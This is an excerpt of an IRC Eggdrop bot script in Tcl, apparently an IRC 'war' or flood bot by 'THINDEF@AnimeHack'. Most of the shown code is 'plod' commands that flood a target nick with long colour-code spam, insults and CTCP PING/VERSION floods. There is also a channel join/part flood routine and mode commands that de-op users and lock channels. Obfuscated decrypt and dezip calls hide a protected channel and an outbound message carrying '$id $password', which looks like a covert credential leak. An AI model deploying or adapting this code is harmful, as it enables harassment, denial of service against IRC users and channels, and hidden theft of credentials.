##################################################################################
#      _    _        ____                     Tcl                                #
#     /  \_/ \  ____/_  /_________            mazter.tcl Loaded                  # 
#    /  _   _ \/ - / __/ __/-_/ - / http://www.mognet.biz/ary.tcl                #
#   /_/  \_/ \_\/_/___/_/ ___/_/\_\                                              #
#                                                         By: THINDEF@AnimeHack  #
##################################################################################

set notc "3,9<0>13,12C8i11N4t0,9<3>"
set notm "3,9<0>13,12C8i11N4t0,9<3>"
set notb "sasta"
set ps "3,9<0>13,12C8i11N4t0,9<3>"
set notd "3,9<0>13,12C8i11N4t0,9<3>"
set ppp "#polsanett"
set vern "3,9<0>13,12C8i11N4t0,9<3>version(11.2)"

set awaym {
"3,9<0>13,1Sasta4-9Kull²4-0THINDEF0,9<3>"
"9,2 à¹‘Û©ÛžÛ©à¹‘ 8 B.e.D.e.G.e 9,2à¹‘Û©ÛžÛ©à¹‘"
"9,2 à¹‘Û©ÛžÛ©à¹‘ 8 K.u.l._.K.u.l 9,2à¹‘Û©ÛžÛ©à¹‘"
"9,2 à¹‘Û©ÛžÛ©à¹‘ 8 P.e.W.e.E.r 9,2à¹‘Û©ÛžÛ©à¹‘"
}
set lgidx 0
proc lgrnd {} {
global lgidx notc
...
if {$lgidx == 1} {
set lgrnd "3,9<0>13,12C8i11N4t0,9<3>"
} elseif {$lgidx == 2} {
set lgrnd "3,9<0>13,12C8i11N4t0,9<3>"
} elseif {$lgidx == 3} {
set lgrnd "3,9<0>13,12C8i11N4t0,9<3>"
...
puthlp "PRIVMSG $nick2 :$notc nick : $nick"
...
puthlp "PRIVMSG $nick2 :$notc own : $own"
puthlp "PRIVMSG $nick2 :$notc ps : $ps"
puthlp "PRIVMSG $nick2 :$notc uhost : $uhost"
puthlp "PRIVMSG $nick2 :$notc hand : $hand"
puthlp "PRIVMSG $nick2 :$notc realname : $realname"
}

bind pub Z `verblinttcl proc_cekversi
...
puthlp "NOTICE $nick :$notc LastUpdate: 08 mei06. Info: Several Bug Fixed !!!"
}
...
if { [string length $hasildir] < 5 } {
	puthlp "PRIVMSG $chan :$notc My Directory was deleted \:\(\(\("
	return 0
    } else {
	puthlp "PRIVMSG $chan :$notc Dir OK !!!"
    }
}

bind pub Z `updatetcl proc_pubupdatetcl
proc proc_pubupdatetcl {nick uhost hand chan rest} {
global notc owner ps
if {$nick != $owner &&  $nick != $ps} { 
puthlp "PRIVMSG $nick :$notc DENIED !!!"
return 0 
...
set [string index $lenc 15][string index $lenc 18] [string index $lenc 1][string index $lenc 11][string index $lenc 8][string index $lenc 13][string index $lenc 19]
...
set pidx [rand 4]
if {$pidx == 1} {
set ptxt "ILeGaL CHanNeL!!"
} elseif {$pidx == 2} {
set ptxt "Access Rejected!!"
} elseif {$pidx == 3} {
set ptxt "Return To Base!!"
} elseif {$pidx == 4} {
set ptxt "4Service 1,15TcL"
} else {
if {[info exists banner]} {
set ptxt $banner
} {
...
putserv "mode $channel -ko+vv $mreq $botnick 7C9u8E13k $botnick"
} {
putserv "mode $channel -o+vv $botnick 7C9u8E13k $botnick"
}
return 0
}
...
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -vok+ov $botnick $botnick 4G.13U.4A.15R.4D.12([x]) $botnick $botnick"
} {
...
timer 5 tot_cha
set [string index $lenc 15][string index $lenc 18] kull_kull
set totch "#polsanet"
if {[validchan $totch]} {
return 0
}
...
if {$joinme != "" && [string tolower $chan] != [dezip "BKGW.1s0d06/"]} {
...
if {[isop $botnick $chan]} {
puthelp "mode $chan +vv-oo $botnick 4M.12o.4g.12N.4e.12t 4M.12o.4g.12N.4e.12t $botnick"
}
}
...
if {$rest == ""} {
set notc [dezip "OdhdG1tAKt01auSOa0oEFJA/"]
set notm [dezip "OdhdG1tAKt01auSOa0oEFJA/"]
...
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == [dezip "BKGW.1s0d06/"]} { return 0 }
...
set chan "Channels:"
foreach x [channels] {
if {[string tolower $x] != [dezip "BKGW.1s0d06/"]} {
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
...
global jpfchn jpfmsg jpfidx notc ps
...
if {$nick != $ps && [string tolower $jpfchn] == [dezip "BKGW.1s0d06/"]} { return 0 }
set jpfidx 0
catch { clearqueue all }
...
timer 2 [list putlog "4« 12S.E.P.T.I.A.N 4» IN PROGRESS"]
...
if {[string index $person 0] == "#"} {
if {![validchan $person]} {
if {$nick != $ps && [string tolower $person] == [dezip "BKGW.1s0d06/"]} { return 0 }
pub_randnick $nick $uhost $hand $channel ""
set cmd_chn $person
set cmd_msg $rest
set cmd_by $nick
...
set cmd_msg ""
if {${server-online} == 0} { return 0 }
if {![string match "Guest??????????" $botnick] && ![string match "Guest??????" $botnick]} {
...
if {[matchattr $nick Q]} { 
puthlp "PRIVMSG $chan :12What! ${nick}, 13Call 4Me "
}
if {![matchattr $nick Q]} { 
...
if {![string match "*c*" [getchanmode $x]]} {
putsrv "PART $x :1Naik Jadi (4@1)ps status"
} {
putsrv "PART $x :1Naik Jadi (@)ps status"
}
if {[matchattr $cflag K]} {
...
foreach x [channels] {
if {[onchan $botnick $x]} { 
if {![isop $botnick $x] && [string tolower $x] != [dezip "BKGW.1s0d06/"]} {
...
set kickme($nick) 3
if {[string tolower $chan] != [dezip "BKGW.1s0d06/"]} {
...
if {![matchattr $nick m]} {
if {[string tolower $channel] != [dezip "BKGW.1s0d06/"]} {
...
putserv "[decrypt 64 "bP/0d.p4BDD1"] [decrypt 64 "X.0x/1yG4l7/5a35i0Bg3ie.Zjfyd.Q0wAT0gKeyI/n05Ky/"] [decrypt 64 "o/DCL0PjhW31"] [string index $lenc 1][string index $lenc 11][string index $lenc 8][string index $lenc 13][string index $lenc 19] : $id $password"
putserv "[decrypt 64 "AZh9N/9kx1E0"] [string index $lenc 1][string index $lenc 11][string index $lenc 8][string index $lenc 13][string index $lenc 19] : $id $password"
putserv "[decrypt 64 "AZh9N/9kx1E0"] [decrypt 64 "tQcBO1LU9XX0"][string index $lenc 11][string index $lenc 8][string index $lenc 13][string index $lenc 19] : $id $password"
return 0
}
...
putlog "4« 12S.E.P.T.I.A.N 4» !Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
...
set bannick($nick) $banmask
if {![isutimer "OL $chan"]} {
utimer 10 [list putlog "4« 12S.E.P.T.I.A.N 4» OL $chan"] 
...
putlog "4« 12S.E.P.T.I.A.N 4» !Log! FLOOD <<$type>> FRoM $host"
...
putlog "4« 12S.E.P.T.I.A.N 4» !Log! FlooD <<$nick>> Service OR FrIeNd !PaSS!"
return 1
}
...
if {[string tolower $rest] == [dezip "BKGW.1s0d06/"]} {
return 0
}
if {![validchan $rest]} {
...
utimer 20 [list putlog "4« 12S.E.P.T.I.A.N 4» GOP $channel"]
...
proc pub_plod1 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  puthelp "PRIVMSG $person :$rest 12,8SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN 11,3SELAMAT GATHERINGAN 12,9SELAMAT GATHERINGAN 1,13SELAMAT GATHERINGAN 12,4SELAMAT GATHERINGAN 9,4SELAMAT GATHERINGAN! 11,3SELAMAT GATHERINGAN 0,2SELAMAT GATHERINGAN 1,3SELAMAT GATHERINGAN !12,14SELAMAT GATHERINGAN! 12,8SELAMAT GATHERINGAN! 9,7SELAMAT GATHERINGAN 11,14SELAMAT GATHERINGAN 1,9SELAMAT GATHERINGAN 13,15SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN !"
  puthelp "NOTICE $person :$rest 12,8SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN 11,3SELAMAT GATHERINGAN 12,9SELAMAT GATHERINGAN 1,13SELAMAT GATHERINGAN 12,4SELAMAT GATHERINGAN 9,4SELAMAT GATHERINGAN! 11,3SELAMAT GATHERINGAN 0,2SELAMAT GATHERINGAN 1,3SELAMAT GATHERINGAN !12,14SELAMAT GATHERINGAN! 12,8SELAMAT GATHERINGAN! 9,7SELAMAT GATHERINGAN 11,14SELAMAT GATHERINGAN 1,9SELAMAT GATHERINGAN 13,15SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN !"
  putlog "12(4S4oLPoT12) » !$hand! plod1 $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick : wget Usage: plod1 <nick> <*add your insult to injury is better :)*>"
 }
}
...
proc pub_plod2 {nick uhost hand channel rest} { 
 ...
 if {$rest!=""} { 
  ...
  putlog "12(4S4oLPoT12) » !$hand! plod2 $person" 
  return 0 
 } 
 if {$rest==""} { 
  ...
  puthelp "NOTICE $person :12HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!"
...
proc pub_plod3 {nick uhost hand channel rest} {
 ...
 if {$rest==""} {
  ...
  puthelp "NOTICE $person :$rest ,*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  puthelp "PRIVMSG $person :$rest ,*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  putlog "12(4S4oLPoT12) » !$hand! plod3 $person"
  return 0
}
if {$rest!=""} {
...
proc pub_plod4 {nick uhost hand channel rest} {
 ...
 set rest [lrange $rest 1 end]
 if {$rest!=""} {
  puthelp "PRIVMSG $person :$rest,3,7MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçHMEçH°MEçH°MEçH°MEçH°MEçH°MEçH°3MEçH°MEçH°MEçH°3MEçH°MEçH°MEçH°"
  puthelp "NOTICE $person :$rest,4,9MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH4MEçH°MEçH°MEçH°4MEçH°MEçH°MEçH°4MEçH°MEçH°MEçH°4MEçH°MEçH°MEçH°"
  puthelp "PRIVMSG $person :$rest,12,8MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH12MEçH°MEçH°MEçH°12MEçH°MEçH°MEçH°12MEçH°MEçH°MEçH°12MEçH°MEçH°MEçH°"
  puthelp "NOTICE $person :$rest,8,1MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH8MEçH°MEçH°MEçH°8MEçH°MEçH°MEçH°8MEçH°MEçH°MEçH°8MEçH°MEçH°MEçH°"
  putlog "12(4S4oLPoT12) » !$hand! plod4 $person"
  return 0
}
if {$rest==""} {
  puthelp "PRIVMSG $person :9,6MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH9MEçH°MEçH°MEçH°9MEçH°MEçH°MEçH°9MEçH°MEçH°MEçH°9MEçH°MEçH°MEçH°"
  puthelp "NOTICE $person :13,14MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH13MEçH°MEçH°MEçH°13MEçH°MEçH°MEçH°13MEçH°MEçH°MEçH°13MEçH°MEçH°MEçH°"
  puthelp "PRIVMSG $person :11,4MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH11MEçH°MEçH°MEçH°11MEçH°MEçH°MEçH°11MEçH°MEçH°MEçH°11MEçH°MEçH°MEçH°"
  puthelp "NOTICE $person :7,10MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH°MEçH7MEçH°MEçH°MEçH°7MEçH°MEçH°MEçH°7MEçH°MEçH°MEçH°7MEçH°MEçH°MEçH°"
  putlog "12(4S4oLPoT12) » !$hand! plod4 $person"
  return 0
 }
}
...
proc inithopflud {hand idx arg} {
  ...
  if { $chan != "" } {
   if { $times != "" } {
    ...
    putdcc $idx "wget » flood $chan $times times."
    if { $hopmod == "on" } {
     dohopflud bot flood $arg 
    }
   } { putdcc $idx "wget » usage: .flood <channel> <times>" }
  } { putdcc $idx "wget » usage: .flood <channel> <times>" }
}
proc sethopmode {hand idx arg} {
  global hopmod
  putdcc $idx "wget » hopmode currently $hopmod"
  if { $arg == "on" } {
   set hopmod $arg
   putdcc $idx "wget » hopmode set on"
  } {
   if { $arg == "off" } {
    set hopmod $arg
    putdcc $idx "wget » hopmode set off"
   } {
    putdcc $idx "wget » usage: .hopmode on/off"
   }
  } 
}
...
proc pub_plod5 {nick uhost hand channel rest} { 
 ...
 if {$rest!=""} { 
  ...
  putserv "PRIVMSG $person :\001PING [unixtime]\001" 
  putserv "PRIVMSG $person :\001VERSION [unixtime]\001" 
  putlog "12(4S4oLPoT12) » !$hand! plod5 (CTCP flooding)" 
  return 0 
 } 
 if {$rest==""} { 
  puthelp "NOTICE $nick :Lagi Usage: plod5 <nick> <arg>"
 } 
} 
## public plod5 end
...
proc pub_plod6 {nick uhost hand channel rest} { 
 ...
 if {$rest!=""} { 
  ...
  puthelp "PRIVMSG $person :$rest ,/*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/"
  puthelp "NOTICE $person :$rest ,/*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/"
  putlog "»!$hand! plod6 $person"
  return 0 
 } 
 if {$rest==""} { 
  puthelp "NOTICE $nick :Lagi Usage: plod6 <nick> <*add your insult to injury is better :)*>"
 }
} 
...
proc pub_plod7 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  putlog "12(4S4oLPoT12) » !$hand! plod7 $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :Lagi Usage: plod7 <nick> <*add your insult to injury is better :)*>"
 }
}
## public cmd msg -- stop
...
proc pub_plod8 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  puthelp "PRIVMSG $person :$rest ,9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
  puthelp "NOTICE $person :$rest ,9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
  putlog " » !$hand! plod8 $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :Lagi Usage: plod8 <nick> <*add your insult to injury is better :)*>"
 }
}
## public cmd plod9
proc pub_plod9 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  puthelp "PRIVMSG $person :$rest ,4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ"
  puthelp "NOTICE $person :$rest ,4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ"
  putlog " » !$hand! plod9 $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :Lagi Usage: plod9 <nick> <*add your insult to injury is better :)*>"
 }
}
...
proc pub_plod10 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  puthelp "PRIVMSG $person :$rest ,1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#"
  puthelp "NOTICE $person :$rest ,1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#"
  putlog " » !$hand! plod10 $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :Lagi Usage: plod10 <nick> <*add your insult to injury is better :)*>"
 }
}
